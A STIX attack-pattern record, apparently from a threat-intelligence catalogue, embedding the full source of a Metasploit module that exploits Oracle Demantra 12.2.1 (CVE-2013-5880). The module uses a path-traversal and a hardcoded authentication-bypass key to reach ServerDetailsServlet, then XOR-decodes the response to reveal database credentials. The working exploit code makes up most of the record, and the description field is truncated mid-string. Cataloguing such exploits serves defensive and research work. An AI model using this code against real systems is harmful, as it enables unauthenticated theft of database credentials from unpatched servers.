{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0be437af-4b32-42b3-8f8b-513f8695ff21",
    "created": "2024-08-14T16:30:38.877601Z",
    "modified": "2024-08-14T16:30:38.877605Z",
    "name": "Oracle Demantra Database Credentials Leak",
    "description": " This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in combination with an authentication bypass. This way an unauthenticated user can retrieve the database name, username and password on any vulnerable machine.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/oracle_demantra_database_credentials_leak.rb",
            "external_id": "oracle_demantra_database_credentials_leak.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5880"
        },
        {
            "source_name": "reference",
            "url": "https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5795/"
        },
        {
            "source_name": "reference",
            "url": "https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Demantra Database Credentials Leak',\n      'Description'    => %q{\n        This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in\n        combination with an authentication bypass. This way an unauthenticated user can retrieve\n        the database name, username and password on any vulnerable machine.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2013-5795'],\n          [ 'CVE', '2013-5880'],\n          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5795/'],\n          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/' ]\n        ],\n      'Author'         =>\n        [\n          'Oliver Gruskovnjak'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2014-02-28'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptBool.new('SSL',   [false, 'Use SSL', false])\n      ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('demantra', 'common', 'loginCheck.jsp', '..', '..', 'ServerDetailsServlet'),\n      'vars_get' => {\n        'UAK' => '406EDC5447A3A43551CDBA06535FB6A661F4DC1E56606915AC4E382D204B8DC1'\n      }\n    })\n\n    if res.nil? or res.body.empty?\n      vprint_error(\"No content retrieved\")\n      return\n    end\n\n    if res.code == 404\n      vprint_error(\"File not found\")\n      return\n    end\n\n    if res.code == 200\n      creds = \"\"\n\n      vprint_status(\"String received: #{res.body.to_s}\") unless res.body.blank?\n\n      res.body.to_s.split(\",\").each do|c|\n        i = c.to_i ^ 0x50\n        creds += i.chr\n      end\n      print_good(\"Credentials decoded: #{creds}\") unless creds.empty?\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-02-28"
}